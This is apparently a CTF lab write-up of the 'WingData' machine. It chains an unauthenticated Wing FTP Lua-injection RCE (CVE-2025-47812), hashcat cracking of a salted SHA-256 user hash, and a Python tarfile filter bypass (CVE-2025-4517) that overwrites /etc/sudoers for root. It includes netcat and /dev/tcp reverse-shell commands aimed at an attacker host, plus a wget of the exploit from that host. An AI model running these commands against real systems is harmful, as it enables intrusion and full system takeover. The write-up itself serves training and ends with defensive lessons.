Wing FTP Server v7.4.3 web client exposing an unauthenticated Lua-injection RCE (CVE-2025-47812), with lateral movement to a Linux user via cracking a SHA-256 password hash extracted from the server's user database. Privilege escalation via CVE-2025-4517, a Python `tarfile` `data`-filter bypass abused through a sudo-allowed restore script.

## Tools Used

| Tool          | Description                                                                              |

| ping          | ICMP utility to verify host reachability                                                 |
| nmap          | Network port scanner and service fingerprinter                                           |
| Web browser   | Manual web application exploration and virtual-host discovery                            |
| Python 3      | Used to run the public CVE-2025-47812 PoC and the CVE-2025-4517 PoC                      |

## Reconnaissance & Enumeration

The objective of this phase was to map the attack surface and identify which service held the entry point.

### Host Discovery

Connectivity to the target was confirmed with ICMP, and the TTL value gave an early operating-system hint:

```bash
ping 10.129.244.106
PING 10.129.244.106 (10.129.244.106) 56(84) bytes of data.
64 bytes from 10.129.244.106: icmp_seq=1 ttl=63 time=43.7 ms
64 bytes from 10.129.244.106: icmp_seq=2 ttl=63 time=43.2 ms
```

A TTL of 63 indicates Linux. The default initial TTL for Linux kernels is 64; the response crossed exactly one routing hop on the way back, which decremented it to 63. With the host confirmed alive, I moved on to a full TCP port sweep.

### Port Scan

A SYN scan was run across all 65535 TCP ports at a high packet rate. `-Pn` skipped host discovery (ICMP had already confirmed liveness), `-n` disabled reverse DNS to keep the scan fast, and the grepable output format (`-oG`) made the result easy to post-process:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n -oG allPorts 10.129.244.106
Host: 10.129.244.106 ()  Status: Up
Host: 10.129.244.106 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: filtered (65533)
```

Only two ports responded: SSH and HTTP. The fact that the remaining 65533 ports came back as **filtered** rather than **closed** strongly suggests a firewall in front of the host silently dropping packets to everything except 22 and 80 — useful context, because it means there is no hidden second web service or management port to discover.

A targeted scan with service detection and default scripts was launched against those two ports:

```bash
nmap -p22,80 -sCV -oN nmap 10.129.244.106
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
```

Two observations were relevant. **OpenSSH 9.2p1 (Debian)** is current and unlikely to be a direct entry point. The HTTP server, however, returned a redirect to **`http://wingdata.htb/`** — which tells us two things at once: the application uses name-based virtual hosting (a request by IP alone will not load the right vhost), and there is at least one domain configured on the server, which may not be the only one.

The domain was added to `/etc/hosts` so it would resolve locally to the target IP, and from then on the application could be browsed by name:

```bash
echo "10.129.244.106 wingdata.htb" | sudo tee -a /etc/hosts
```

### Web Application

Browsing to `http://wingdata.htb/` loaded the **Wing Data Solutions** corporate site — a static marketing page describing a file-sharing platform. The interesting element was the top-right **Client Portal** button:

![WingData corporate site](/assets/img/HTB/Wingdata/web1.png)

Clicking it triggered a redirect to a different host: **`ftp.wingdata.htb`**. This is the second virtual host hinted at by the redirect behavior earlier, and it had to be added to `/etc/hosts` as well in order to resolve:

```bash
echo "10.129.244.106 ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

The subdomain served a web-based FTP login portal whose footer disclosed the product name and exact version:

![Wing FTP Server v7.4.3 login portal](/assets/img/HTB/Wingdata/web2.png)

> *FTP server software powered by **Wing FTP Server v7.4.3***

This version banner is the entire foothold: Wing FTP Server ≤ 7.4.3 is affected by **CVE-2025-47812**, a pre-authentication remote code execution flaw published in mid-2025 with a public PoC on Exploit-DB.

## Exploitation

### CVE-2025-47812 — Wing FTP Server Unauthenticated RCE

The vulnerability is rooted in a **string-handling discrepancy** between two components of Wing FTP's authentication flow:

- The credential validation routine (`c_CheckUser()`) processes the submitted `username` as a C string, meaning it **truncates at the first NULL byte (`\x00`)**. A username of `anonymous\x00<anything>` therefore validates as the legitimate `anonymous` account.
- The session-creation logic, however, takes the **full unsanitized username** — NULL byte and all the bytes after it — and writes it verbatim into a Lua session file on disk.

Because the session file is later evaluated as Lua when an authenticated endpoint such as `/dir.html` is accessed, anything appended after the NULL byte becomes server-side Lua code that executes with the privileges of the Wing FTP service process. The exploit is therefore a single-shot, two-request attack: one POST to `/loginok.html` to plant the payload (Wing FTP cheerfully accepts the anonymous half of the username and stores the Lua half), and one GET to `/dir.html` using the returned UID cookie to detonate it.

I pulled the public PoC from Exploit-DB (entry 52347) and confirmed the target was vulnerable with a benign command that doesn't change anything on the box but does prove code execution:

```bash
python3 exploit.py -u http://ftp.wingdata.htb/ -c "which nc"
/usr/bin/nc
```

Two findings at once: the exploit works (Lua code is executing on the target and command output is being returned in the HTTP response), and the system has **netcat installed**. That second detail mattered for what came next. My initial attempts to use a `bash -i >& /dev/tcp/...` reverse shell failed — the Lua context wrapping the injected command did not handle bash's redirection syntax cleanly — so I pivoted to a netcat reverse shell using the `-c` option. The `-c` flag is only present in **netcat-traditional** (it was removed from the OpenBSD rewrite for being too obvious a backdoor primitive), so it can't always be assumed available, but the target was running the traditional build.

A listener was started on the attacker box:

```bash
nc -lvp 4444
Listening on 0.0.0.0 4444
```

And the exploit was launched again, this time with the reverse-shell payload as the command:

```bash
python3 exploit.py -u http://ftp.wingdata.htb/ -c "nc -c /bin/bash <ATTACKER_IP> 4444"
```

The listener caught the callback almost immediately:

```text
Connection received on ftp.wingdata.htb 56162
```

The shell landed as the `wingftp` service user. The raw shell was unusable for anything interactive (no job control, no tab completion, no Ctrl+C without killing the connection), so I performed the standard TTY upgrade: spawn a PTY with `script`, background it, fix the terminal modes from the attacker side, and bring it back to the foreground:

```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
wingftp@wingdata:/opt/wftpserver$ ^Z
[1]+  Detenido                   nc -lvp 4444
stty raw -echo; fg
nc -lvp 4444
            reset
wingftp@wingdata:/opt/wftpserver$
```

> **Note on privileges**: although the CVE description states that the RCE runs as root on Linux, on this box the Wing FTP service had been configured to drop privileges to a dedicated `wingftp` account before serving requests — sensible hardening that turned an instant-root advisory into a multi-step engagement. The initial working directory `/opt/wftpserver` also tells us exactly where the application lives on disk, which becomes important in the next phase.

## Lateral Movement — `wingftp` → `wacky`

With a shell as the `wingftp` service user, the natural place to enumerate next was the application's own data directory. Wing FTP stores its server-wide configuration and per-user account database under `/opt/wftpserver/Data`, and since the shell is already running as the service user, all of those files are readable:

```bash
ls /opt/wftpserver/Data
```

The directory contained the global server configuration and a per-user XML file for every defined account. Two of these files were directly relevant.

**The server settings file** disclosed the global salt that Wing FTP uses for password hashing:

```xml
<SaltingString>WingFTP</SaltingString>
```

A single global salt is already a design weakness — every account on the server is hashed with the same `WingFTP` string appended, so a single rainbow table or wordlist run cracks every account simultaneously. The salt being a static, guessable, vendor-default string compounds the problem.

**The user file for `wacky`** contained the SHA-256 password hash:

```xml
<USER>
    <UserName>wacky</UserName>
    <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
    ...
</USER>
```

A 64-character hex string combined with a known salt is a textbook **`sha256($pass.$salt)`** — Wing FTP's documented password storage format and **hashcat mode 1410**. Note that this format is unsalted from the kernel's perspective (the salt is appended to the password in cleartext before hashing, with no iterations and no key-stretching), which makes it extraordinarily cheap to crack on GPU — billions of candidates per second on commodity hardware.

I wrote the hash to a file in the standard hashcat `hash:salt` format and launched a dictionary attack with rockyou:

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hashes.txt
hashcat -a 0 -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
...
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
...
Speed.#01........: 16842.4 kH/s
Recovered........: 2/6 (33.33%) Digests
```

The hash fell in under a second. Recovered password: **`!#7Blushing^*Bride5`**. Despite the leetspeak and symbol decoration, the underlying word is a straight rockyou candidate with simple character substitutions — exactly the class of password a fast unsalted SHA-256 with a known salt cannot defend against.

The recovered credential was reused for the local Linux account `wacky`, so a simple `su` performed the pivot:

```bash
su wacky
Password: !#7Blushing^*Bride5
wacky@wingdata:/opt/wftpserver$ id
uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
```

The user flag was now readable from `wacky`'s home directory:

```bash
cat /home/wacky/user.txt
```

## Privilege Escalation — `wacky` → `root`

With a shell as `wacky`, I began the standard privilege-escalation enumeration. `sudo -l` returned an immediately interesting result:

```bash
sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` can invoke a specific Python script as root without a password, **with an arbitrary trailing argument** (the `*` wildcard at the end of the sudoers entry). The trailing wildcard is the part that makes this exploitable — without it, the script's behaviour would be fixed by whatever hardcoded arguments the administrator passed; with it, the attacker controls what the script operates on.

The script itself was world-readable, so I inspected it:

```bash
cat /opt/backup_clients/restore_backup_clients.py
...
try:
    with tarfile.open(backup_path, "r") as tar:
        tar.extractall(path=staging_dir, filter="data")
    print(f"[+] Extraction completed in {staging_dir}")
except (tarfile.TarError, OSError, Exception) as e:
    print(f"[!] Error during extraction: {e}", file=sys.stderr)
    sys.exit(2)
```

The critical block is the extraction logic. The script takes a backup name on the command line, opens the corresponding tar file from `/opt/backup_clients/backups/`, and extracts it into a staging directory using **`filter="data"`**.

The `filter` keyword argument was added to Python's `tarfile` module specifically to harden it against archive-based attacks. The `data` filter is supposed to be the safe default: it rejects archive members with absolute paths, members whose resolved paths fall outside the extraction root, and members with dangerous types like device files. For years before this filter existed, `tarfile.extractall` was a well-known footgun — and `filter="data"` was the documented fix.

The Python version on the host turned out to be the second half of the precondition:

```bash
/usr/local/bin/python3 --version
Python 3.12.3
```

The combination — `tarfile` with `filter="data"` on a Python version in the range **3.8.0 – 3.13.1** — is exactly the precondition for **CVE-2025-4517**, a bypass of the `data` filter that allows writing arbitrary files **outside** the extraction directory by abusing a flaw in how the filter handles the interaction between symlinks and hardlinks.

### CVE-2025-4517 — concept

The `data` filter is supposed to reject any archive member whose final resolved path lands outside the extraction root. The bypass technique chains several primitives inside a single crafted tar file:

1. **Build a deeply nested directory tree** using extremely long directory names (247 characters of `d`, repeated across 16 levels of nesting). This creates a path structure the filter has to evaluate but doesn't trip its safety checks.
2. **At each level, add a short-named symlink** pointing to the long directory name from the same level. This sets up a symlink loop the filter walks through but doesn't classify as escape.
3. **Add a long symlink chain** whose `linkname` is a stack of `../` segments — enough of them to walk all the way up to the filesystem root regardless of the extraction directory, ending pointed at `/etc`.
4. **Add a hardlink** entry whose target name resolves *through* the symlink chain to `escape/sudoers`. At extraction time, the kernel resolves the symlink chain at hardlink-creation time and the new hardlink ends up pointing at the **inode of `/etc/sudoers`** — outside the staging directory entirely.
5. **Add a regular-file entry** with the same archive name as the hardlink. When `tarfile` opens the destination to write the file's contents, the open follows the hardlink and the write goes **directly into `/etc/sudoers`**.

The net effect is an arbitrary file write as the user running the extraction. Since the sudoers entry runs that user as root, the write lands as root, and `/etc/sudoers` is the natural target because adding `wacky ALL=(ALL) NOPASSWD: ALL` to it produces a clean and unconditional path to a root shell.

### Exploitation

I cloned the public PoC (`AzureADTrent/CVE-2025-4517-POC`) on my attacker host and served it over an ad-hoc Python HTTP server so the target could fetch it:

```bash
# On the attacker:
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# On the target as wacky:
wget http://<ATTACKER_IP>:8000/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py
```

The PoC builds the malicious tar following the five-step pattern described above, with a `sudoers` entry of `wacky ALL=(ALL) NOPASSWD: ALL` as the payload. It drops the archive into `/opt/backup_clients/backups/backup_9999.tar` (where the vulnerable script expects to find backups), and then invokes the sudo-allowed restore command with that filename to trigger extraction as root:

```text
[*] Target user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[+] Exploit deployed successfully
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
```

With `wacky` now holding `NOPASSWD: ALL` in `/etc/sudoers`, the final step was a single sudo invocation:

```bash
sudo /bin/bash
root@wingdata:/tmp# whoami
root
```

The root flag was readable from `/root`:

```bash
cat /root/root.txt
```

## Key Takeaways

- **Banner-level version disclosure remains decisive.** "Wing FTP Server v7.4.3" in the login portal footer is the entire foothold — no enumeration depth required when the version label points directly at a published CVE.
- **Privilege drop matters.** A vendor advisory describing an RCE as "root on Linux" can be misleading in practice. Whether the running service drops to a dedicated low-privileged account before serving requests changes the entire post-exploitation path. The hardening worked as designed here, even if the underlying CVE didn't.
- **Application password storage is not always reused safely.** A SHA-256 with a single global, plaintext, vendor-default salt is fast to crack on commodity GPUs once both pieces are recoverable from the same readable directory. `WingFTP` as a salt offered effectively zero work factor against a wordlist attack — measured in milliseconds per hash on a mid-range GPU.
- **`filter="data"` is not a silver bullet.** Hardening Python's `tarfile.extractall` with the new filter API is the right default, but CVE-2025-4517 demonstrates that defense-in-depth still matters: never extract user-controlled archives as root, even with the safe filter enabled. The sudoers wildcard at the end of the rule was the design choice that turned a small parser bug into full system compromise.
